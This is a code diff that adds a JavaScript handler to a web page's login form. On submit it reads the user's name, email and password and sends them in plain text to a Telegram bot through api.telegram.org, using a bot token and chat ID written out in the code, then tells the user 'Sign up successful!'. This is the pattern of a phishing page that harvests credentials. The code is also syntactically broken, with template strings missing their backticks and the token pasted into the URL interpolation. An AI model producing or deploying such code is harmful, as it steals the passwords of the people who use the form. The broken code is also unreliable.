@@ -94,3 +94,37 @@ document.addEventListener('DOMContentLoaded', () => {
 
 })
 
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault(); // Stops the page from reloading
+
+    // 1. Grab all the input values from the HTML form
+    const name = document.getElementById('name').value;
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value; // Grabbed password
+
+    // 2. Package everything into a single text message string
+    const fullMessage = 📝 New Sign-up!\n\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 Password: ${password};
+
+    // 3. Your Telegram configuration
+    const token = '8314676610:AAE75mMYTbtXU1dSKko_OPZJZ0v-sp_IA44';
+    const chatId = '1490539700';
+
+    // 4. Send the data to Telegram's API
+    fetch(https://api.telegram.org/bot${8314676610:AAE75mMYTbtXU1dSKko_OPZJZ0v-sp_IA44}/sendMessage, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            chat_id: chatId, 
+            text: fullMessage 
+        })
+    })
+    .then(response => {
+        if(response.ok) {
+            alert('Sign up successful!');
+        } else {
+            alert('Something went wrong.');
+        }
+    })
+    .catch(error => console.error('Error:', error));
+});
+
